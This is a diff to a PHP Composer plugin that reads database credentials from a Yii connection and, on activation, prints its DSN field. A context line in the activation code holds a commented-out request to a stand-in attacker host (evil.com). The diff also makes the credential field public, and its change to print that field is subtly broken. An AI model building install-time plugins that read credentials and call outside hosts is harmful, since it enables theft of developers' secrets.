@@ -7,20 +7,22 @@ use Composer\Plugin\PluginInterface;
 
 use yii\base\Component;
 use yii\base\Object;
+use yii\db\Connection;
 
 class Plugin extends Object implements PluginInterface
 {
 
   public $clientPath;
   public $host = '127.0.0.1';
-  protected $dsn = [];
+  // protected $dsn = [];
+  public $dsn;
 
-  public function __construct(Component $connection, $config = [])
-  {
-      $this->dsn = array_fill_keys(['user', 'password', 'host', 'port', 'dbname'], null);
-      $this->dsn = $this->parseDsn($connection->dsn);
-      parent::__construct($config);
-  }
+  // public function __construct(Component $connection, $config = [])
+  // {
+  //     $this->dsn = array_fill_keys(['user', 'password', 'host', 'port', 'dbname'], null);
+  //     $this->dsn = $this->parseDsn($connection->dsn);
+  //     parent::__construct($config);
+  // }
 
     /**
      * @param Composer $composer
@@ -61,7 +63,7 @@ class Plugin extends Object implements PluginInterface
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
 
-        print_r("Activated.\n\r");
+        print_r($this->dsn."----Activated.\n\r");
     }
     /**
      * @param string $type
